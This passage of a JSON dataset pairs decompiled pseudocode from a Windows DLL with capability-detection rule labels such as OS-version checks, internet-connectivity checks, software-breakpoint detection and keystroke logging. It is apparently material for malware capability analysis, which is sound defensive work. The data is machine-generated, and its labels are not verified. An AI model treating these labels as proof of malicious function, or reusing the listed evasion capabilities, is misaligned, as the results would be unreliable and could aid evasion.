            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t * fcn.18001c578(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t *piVar6;\n    ulong *puVar7;\n    \n    iVar1 = *arg1;\n    *arg2 = iVar1;\n    if (iVar1 != *arg1) {\n        fcn.180012514();\n        pcVar3 = swi(3);\n        piVar6 = (*pcVar3)();\n        return piVar6;\n    }\n    puVar2 = arg1[1];\n    iVar4 = 1;\n    arg2[1] = puVar2;\n    puVar7 = puVar2;\n    do {\n        if (puVar2 == NULL) break;\n        if (puVar7 != NULL) {\n            puVar7 = *puVar7;\n        }\n        iVar4 = iVar4 + -1;\n    } while (0 < iVar4);\n    while( true ) {\n        if (puVar7 == NULL) {\n            return arg2;\n        }\n        uVar5 = fcn.18001bfac(puVar7[2]);\n        if ((uVar5 >> 0x11 & 1) != 0) break;\n        puVar7 = *puVar7;\n        if (arg2[1] != 0) {\n            if (arg2[1] == NULL) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                piVar6 = (*pcVar3)();\n                return piVar6;\n            }\n            arg2[1] = *arg2[1];\n        }\n    }\n    return arg2;\n}\n",
        "token_count": 392
    },
    "18001c93": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.18001c934(int64_t arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    if (arg1 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    if (*(arg1 + 0x10) == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(arg1 + 0x10))();\n    }\n    return uVar2;\n}\n",
        "token_count": 130
    },
    "18001ca7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001ca7c(ulong arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    \n    iVar3 = arg1;\n    if (0x10 < arg1) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (*0x18006cf3c == 0) {\n        fcn.18001ca4c();\n    }\n    if (*(iVar3 * 4 + 0x18006d210) == 0) {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x18006d1e8);\n        if (*(iVar3 * 4 + 0x18006d210) == 0) {\n            (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(iVar3 * 0x28 + 0x18006cf40);\n            piVar1 = iVar3 * 4 + 0x18006d210;\n            *piVar1 = *piVar1 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x18006d1e8);\n    }\n    // WARNING: Could not recover jumptable at 0x00018001cb06. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x18004c420\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar3 * 0x28 + 0x18006cf40);\n    return;\n}\n",
        "token_count": 355
    },
    "18001ccd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.18001ccd0(ulong hWnd, ulong arg2, ulong noname_2, ulong arg4)\n\n{\n    uchar auStack136 [32];\n    ulong uStack104;\n    uint uStack96;\n    uchar auStack88 [64];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180067ce0 ^ auStack136;\n    (*_sym.imp.USER32.dll_GetClassNameW)(hWnd, auStack88, 0x20);\n    uStack96 = 0xffffffff;\n    uStack104 = arg2;\n    (*_sym.imp.KERNEL32.dll_CompareStringW)(0x409, 1, auStack88);\n    fcn.180032ea0(uStack24 ^ auStack136);\n    return;\n}\n",
        "token_count": 168
    },
    "18001d01": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * fcn.18001d014(int64_t *arg1, int32_t *arg2)\n\n{\n    int32_t *piVar1;\n    int64_t **ppiVar2;\n    int64_t *piVar3;\n    int32_t **ppiVar4;\n    \n    piVar1 = (**(*arg1 + 0x88))();\n    if (piVar1 == NULL) {\n        ppiVar2 = (**(*arg1 + 0x70))();\n        if ((((*0x180056148 == *arg2) && (arg2[1] == *0x18005614c)) && (arg2[2] == *0x180056150)) &&\n           (arg2[3] == *0x180056154)) {\n            do {\n                for (piVar3 = ppiVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n                    if (*(piVar3[1] + arg1) != 0) {\n                        return piVar3[1] + arg1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        else {\n            do {\n                for (ppiVar4 = ppiVar2[1]; piVar1 = *ppiVar4,  piVar1 != NULL; ppiVar4 = ppiVar4 + 2) {\n                    if (((*piVar1 == *arg2) && (piVar1[1] == arg2[1])) &&\n                       ((piVar1[2] == arg2[2] && ((piVar1[3] == arg2[3] && (*(ppiVar4[1] + arg1) != 0)))))) {\n                        return ppiVar4[1] + arg1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 442
    },
    "18001d0e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t fcn.18001d0e8(int64_t *arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int64_t iStackX8;\n    \n    piVar3 = (**(*arg1 + 0x70))();\n    do {\n        for (piVar4 = piVar3[1]; *piVar4 != 0; piVar4 = piVar4 + 2) {\n        }\n        for (piVar4 = piVar4 + 1; *piVar4 != -1; piVar4 = piVar4 + 2) {\n            puVar1 = *(arg1 + *piVar4);\n            if (puVar1 != NULL) {\n                iStackX8 = 0;\n                iVar2 = (***puVar1)(puVar1, arg2, &iStackX8);\n                if ((iVar2 == 0) && (iStackX8 != 0)) {\n                    return iStackX8;\n                }\n            }\n        }\n        piVar3 = *piVar3;\n        if (piVar3 == NULL) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 278
    },
    "18001d1a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.18001d1a0(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar3;\n    ulong uStack32;\n    int32_t iStack24;\n    \n    uVar3 = 0xfffffffffffffffe;\n    if (*(arg1 + 1) == 0) {\n        iVar2 = 0;\n    }\n    else {\n        LOCK();\n        piVar1 = arg1 + 1;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        iVar2 = iVar2 + -1;\n        if (iVar2 == 0) {\n            fcn.1800140d4(&uStack32, arg1[7]);\n            (**(*arg1 + 0x20))(arg1);\n            if (iStack24 != 0) {\n                fcn.18001357c(0, uStack32, in_R8, in_R9, uVar3);\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 247
    },
    "18001d77": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001d770(uint16_t *arg1, ulong pvargSrc, ulong arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int64_t iVar3;\n    \n    if ((((arg3 != 0) && (arg4 != 0)) && ((pvargSrc & 0x2000) == 0)) &&\n       ((((pvargSrc & 0x4000) == 0 && ((pvargSrc & 0x1000) == 0)) && ((pvargSrc != 0 && (pvargSrc != 1)))))) {\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n        iVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayDestroy)(pvargSrc, arg3, arg4);\n        *(arg1 + 4) = iVar3;\n        if (iVar3 == 0) {\n            fcn.1800124cc();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        *(arg1 + 0xe) = arg3;\n        *arg1 = pvargSrc | 0x2000;\n        uVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(iVar3);\n        *(arg1 + 0xc) = uVar2;\n        return;\n    }\n    fcn.180012514();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 330
    },
    "18001e21": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool fcn.18001e210(int64_t arg1, ulong *arg2)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    uint auStackX8 [2];\n    uint auStackX16 [2];\n    int64_t *piStackX24;\n    int64_t *piStackX32;\n    int64_t *piStack56;\n    int64_t iStack48;\n    int64_t *piStack40;\n    ulong *puStack32;\n    \n    uVar2 = *0x180056040;\n    uVar1 = *0x180056038;\n    uVar4 = 0;\n    piStack56 = NULL;\n    *arg2 = *0x180056038;\n    arg2[1] = uVar2;\n    iVar3 = (****(arg1 + 0x80))(uVar1, *(arg1 + 0x80), 0x180056188, &piStack56);\n    if (-1 < iVar3) {\n        (**(*piStack56 + 0x20))(piStack56, 1, arg2);\n        (**(*piStack56 + 0x10))();\n    }\n    piStack40 = NULL;\n    iVar3 = fcn.180034630(arg2, 0x180056038, 0x10);\n    if (iVar3 == 0) {\n        iVar3 = (****(arg1 + 0x80))(*(arg1 + 0x80), 0x180056178, &piStack40);\n        if (-1 < iVar3) {\n            piStackX24 = NULL;\n            iVar3 = (**(*piStack40 + 0x18))(piStack40, &piStackX24);\n            if (-1 < iVar3) {\n                iVar3 = (**(*piStackX24 + 0x18))(piStackX24, &iStack48);\n                if (-1 < iVar3) {\n                    bVar5 = *(iStack48 + 0x34) != 0;\n                    while (bVar5) {\n                        iVar3 = (**(*piStackX24 + 0x48))(piStackX24, uVar4, auStackX8);\n                        if ((-1 < iVar3) && ((auStackX8[0] & 7) == 3)) {\n                            piStackX32 = NULL;\n                            iVar3 = (**(*piStackX24 + 0x40))(piStackX24, uVar4, auStackX16);\n                            if (-1 < iVar3) {\n                                iVar3 = (**(*piStackX24 + 0x70))(piStackX24, auStackX16[0], &piStackX32);\n                                if (-1 < iVar3) {\n                                    iVar3 = (**(*piStackX32 + 0x18))(piStackX32, &puStack32);\n                                    if (-1 < iVar3) {\n                                        uVar1 = *puStack32;\n                                        uVar2 = puStack32[1];\n                                        *arg2 = uVar1;\n                                        arg2[1] = uVar2;\n                                        (**(*piStackX32 + 0x98))(uVar1);\n                                    }\n                                    (**(*piStackX32 + 0x10))();\n                                }\n                            }\n                            break;\n                        }\n                        uVar4 = uVar4 + 1;\n                        bVar5 = uVar4 < *(iStack48 + 0x34);\n                    }\n                    (**(*piStackX24 + 0x98))(piStackX24, iStack48);\n                }\n                (**(*piStackX24 + 0x10))();\n            }\n            (**(*piStack40 + 0x10))();\n        }\n    }\n    iVar3 = fcn.180034630(arg2, 0x180056038, 0x10);\n    return iVar3 != 0;\n}\n",
        "token_count": 854
    },
    "18001e54": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001e540(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t *piStackX8;\n    \n    if ((*(arg1 + 0x16) >> 0xe & 1) == 0) {\n        (**(*arg1 + 0x160))();\n    }\n    piStackX8 = NULL;\n    if (arg1[0x10] == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar2 = (***arg1[0x10])(arg1[0x10], 0x180056198, &piStackX8);\n    if (-1 < iVar2) {\n        if (piStackX8 == NULL) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        (**(*piStackX8 + 0x20))(piStackX8, arg2);\n        (**(*piStackX8 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "18001e5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001e5c4(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t *apiStackX8 [4];\n    \n    if (*(arg1 + 0x80) == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    apiStackX8[0] = NULL;\n    iVar2 = (****(arg1 + 0x80))(*(arg1 + 0x80), 0x180056198, apiStackX8);\n    if (-1 < iVar2) {\n        if (apiStackX8[0] == NULL) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        (**(*apiStackX8[0] + 0x30))(apiStackX8[0], arg2);\n        (**(*apiStackX8[0] + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 242
    },
    "18001e68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001e688(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t *piVar2;\n    \n    *(arg1 + 0x48) = 0;\n    piVar2 = *(arg1 + 0x50);\n    if (piVar2 != NULL) {\n        if (piVar2[8] != 0) {\n            piVar2 = (**(*piVar2 + 0x1f0))();\n            iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(*(arg1 + 0x50) + 0x40));\n            if ((iVar1 != 0) && (*piVar2 != 0)) {\n                fcn.1800184f0(*(arg1 + 0x50));\n            }\n            fcn.180017d08(*(arg1 + 0x50));\n        }\n        *(*(arg1 + 0x50) + 0xa0) = 0;\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "18001f13": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.18001f130(ulong noname_0, uint *arg2, uint *arg3)\n\n{\n    uint64_t arg2_00;\n    int32_t iVar1;\n    uint64_t uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    \n    arg2[4] = arg3[4];\n    iVar1 = arg3[4];\n    if (iVar1 == 0) {\n        uVar3 = arg3[1];\n        uVar4 = arg3[2];\n        uVar5 = arg3[3];\n        *arg2 = *arg3;\n        arg2[1] = uVar3;\n        arg2[2] = uVar4;\n        arg2[3] = uVar5;\ncode_r0x00018001f17b:\n        iVar6 = fcn.180033b84(*(arg3 + 6));\n        arg2_00 = iVar6 + 1;\n        if (arg2_00 < 0x100000000) {\n            uVar2 = (arg2_00 & 0xffffffff) * 2;\n            if (uVar2 < 0x100000000) {\n                iVar6 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(uVar2 & 0xffffffff);\n            }\n            else {\n                iVar6 = 0;\n            }\n            *(arg2 + 6) = iVar6;\n            if (iVar6 != 0) {\n                fcn.180035a14(iVar6, arg2_00, *(arg3 + 6));\n                goto code_r0x00018001f1c4;\n            }\n        }\n        uVar7 = 0;\n    }\n    else {\n        if (iVar1 == 1) {\n            uVar3 = arg3[1];\n            uVar4 = arg3[2];\n            uVar5 = arg3[3];\n            *arg2 = *arg3;\n            arg2[1] = uVar3;\n            arg2[2] = uVar4;\n            arg2[3] = uVar5;\n            arg2[6] = arg3[6];\n        }\n        else if (iVar1 == 2) goto code_r0x00018001f17b;\ncode_r0x00018001f1c4:\n        uVar7 = 1;\n    }\n    return uVar7;\n}\n",
        "token_count": 541
    },
    "18001f26": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.18001f264(int64_t pvarg)\n\n{\n    int64_t *piVar1;\n    ulong uVar2;\n    \n    if (*(pvarg + 0x10) == 0) {\n        uVar2 = 0;\n    }\n    else {\n        (**(**(pvarg + 0x10) + 0x168))();\n        piVar1 = *(*(pvarg + 0x10) + 0xd8);\n        (**(*piVar1 + 8))(piVar1, pvarg, 1);\n        uVar2 = (****(*(pvarg + 0x10) + 0xd8))();\n    }\n    return uVar2;\n}\n",
        "token_count": 153
    },
    "18002dce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002dce4(int64_t **arg1)\n\n{\n    if (*arg1 != NULL) {\n        if (*(arg1 + 1) != 0) {\n            (**(**arg1 + 0x10))();\n        }\n        *arg1 = NULL;\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "18001f48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.18001f480(int64_t arg1, uint64_t arg2, ushort *arg3)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    \n    if (*(arg1 + 0x38) == '\\0') {\n        iVar2 = *(arg1 + 0x28);\n        if (arg2 <= *(arg1 + 0x18) + -1 + *(iVar2 + 0x10)) {\n            arg2 = arg2 - *(iVar2 + 0x10);\ncode_r0x00018001f4dc:\n            if (arg3 != NULL) {\n                *arg3 = *(iVar2 + 0x28 + arg2 * 0x50);\n                return 1;\n            }\n        }\n    }\n    else {\n        uVar3 = 0;\n        if (*(arg1 + 0x18) != 0) {\n            iVar2 = *(arg1 + 0x28);\n            puVar1 = iVar2 + 0x10;\n            do {\n                if (*puVar1 == arg2) {\n                    arg2 = uVar3;\n                    goto code_r0x00018001f4dc;\n                }\n                uVar3 = uVar3 + 1;\n                puVar1 = puVar1 + 10;\n            } while (uVar3 < *(arg1 + 0x18));\n        }\n    }\n    return 0;\n}\n",
        "token_count": 320
    },
    "18002152": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.180021524(int64_t **arg1)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    \n    uVar4 = 0;\n    uVar5 = 0;\n    uVar1 = *(arg1[2] + 1);\n    if (uVar1 != 0) {\n        iVar6 = 0;\n        do {\n            piVar2 = arg1[2];\n            if (((uVar5 < *(piVar2 + 1)) && (*piVar2 != 0)) && (*(iVar6 + 8 + *piVar2) != '\\0')) {\n                if (uVar5 < *(piVar2 + 1)) {\n                    uVar7 = *(iVar6 + *piVar2);\n                }\n                else {\n                    uVar7 = 0;\n                }\n                uVar3 = (**(**arg1 + 0x20))(*arg1, arg1[3], uVar7, piVar2[2]);\n                uVar4 = uVar3 & 0xffffffff;\n                if (uVar3 < 0) {\n                    return uVar3;\n                }\n            }\n            uVar5 = uVar5 + 1;\n            iVar6 = iVar6 + 0x10;\n        } while (uVar5 < uVar1);\n    }\n    return uVar4;\n}\n",
        "token_count": 335
    },
    "180021ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.180021ae8(int64_t *arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int64_t *piStackX16;\n    \n    if (arg2 == NULL) {\ncode_r0x000180021b07:\n        iVar1 = -0x7fffbffb;\n    }\n    else {\n        if (*(arg1 + 1) == 0) {\n            return 0;\n        }\n        piStackX16 = NULL;\n        iVar1 = (***arg2)(arg2, 0x1800514d8, &piStackX16);\n        if (-1 < iVar1) {\n            if (*arg1 == 0) {\n                if (piStackX16 != NULL) {\n                    (**(*piStackX16 + 0x10))();\n                }\n                goto code_r0x000180021b07;\n            }\n            uVar3 = 0;\n            if (*(arg1 + 1) != 0) {\n                iVar2 = 0;\n                do {\n                    (**(*piStackX16 + 0x30))(piStackX16, *(*arg1 + iVar2), 0);\n                    uVar3 = uVar3 + 1;\n                    iVar2 = iVar2 + 0x10;\n                } while (uVar3 < *(arg1 + 1));\n            }\n        }\n        *(arg1 + 1) = 0;\n        fcn.1800096a4(*arg1);\n        *arg1 = 0;\n        if (piStackX16 != NULL) {\n            (**(*piStackX16 + 0x10))();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 380
    },
    "18002263": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.180022638(int64_t arg1, ulong arg2)\n\n{\n    uint16_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    \n    uVar3 = 0;\n    if (*(arg1 + 0x18) != 0) {\n        iVar5 = 0;\n        do {\n            if ((*(arg1 + 0x20) == 0) || (*(*(arg1 + 0x20) + uVar3) != '\\x01')) {\n                iVar2 = *(arg1 + 0x28);\n                if ((*(iVar2 + 0x28 + iVar5) == 0xd) || (*(iVar2 + 0x28 + iVar5) == 9)) {\n                    if (*((*(iVar2 + 0x20 + iVar5) + 7 + *(iVar2 + 8 + iVar5) & 0xfffffffffffffff8U) + 8 +\n                         *(arg1 + 0x10)) != 0) goto code_r0x00018002272b;\n                    uVar1 = *(*(arg1 + 0x28) + 0x28 + iVar5);\n                    iVar2 = *(arg1 + 0x10) + *(*(arg1 + 0x28) + 8 + iVar5);\n                }\n                else {\n                    uVar1 = *(iVar2 + 0x28 + iVar5);\n                    iVar2 = *(iVar2 + 8 + iVar5) + *(arg1 + 0x10);\n                }\n                fcn.180022540(uVar1, iVar2, arg2);\n            }\n            else if (((*((*(*(arg1 + 0x28) + 0x20 + iVar5) + 7 + *(*(arg1 + 0x28) + 8 + iVar5) & 0xfffffffffffffff8U) +\n                         8 + *(arg1 + 0x10)) != 3) &&\n                     (piVar4 = *(*(arg1 + 0x28) + 8 + iVar5) + *(arg1 + 0x10),  piVar4 != NULL)) && (*piVar4 != 0)) {\n                (*_sym.imp.ole32.dll_CoTaskMemFree)(*piVar4);\n                *piVar4 = 0;\n            }\ncode_r0x00018002272b:\n            uVar3 = uVar3 + 1;\n            iVar5 = iVar5 + 0x50;\n        } while (uVar3 < *(arg1 + 0x18));\n    }\n    return;\n}\n",
        "token_count": 579
    },
    "180022b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180022b94(int64_t *arg1, ulong *arg2)\n\n{\n    uint64_t *puVar1;\n    uint16_t *puVar2;\n    int64_t *piVar3;\n    uchar uVar4;\n    uchar uVar5;\n    uint8_t uVar6;\n    int64_t iVar7;\n    code *pcVar8;\n    ulong uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    ulong uVar12;\n    int64_t *arg1_00;\n    int64_t iVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    int64_t *piVar17;\n    uint64_t arg1_01;\n    uchar auStack344 [32];\n    ulong uStack312;\n    uchar uStack304;\n    uint uStack296;\n    uint64_t uStack288;\n    uint64_t uStack280;\n    int64_t iStack272;\n    uint *puStack264;\n    char cStack248;\n    uint16_t uStack246;\n    uint *puStack240;\n    uint32_t uStack232;\n    int64_t *piStack224;\n    int64_t *piStack216;\n    uint64_t uStack208;\n    ulong *puStack200;\n    int64_t *piStack192;\n    uint *puStack184;\n    ushort uStack176;\n    int64_t *piStack168;\n    uint64_t uStack160;\n    int64_t *piStack152;\n    ulong *puStack144;\n    int32_t iStack136;\n    int32_t iStack132;\n    uint uStack128;\n    uint uStack124;\n    ulong uStack120;\n    ulong uStack72;\n    ulong uStack64;\n    uint64_t uStack56;\n    \n    uStack120 = 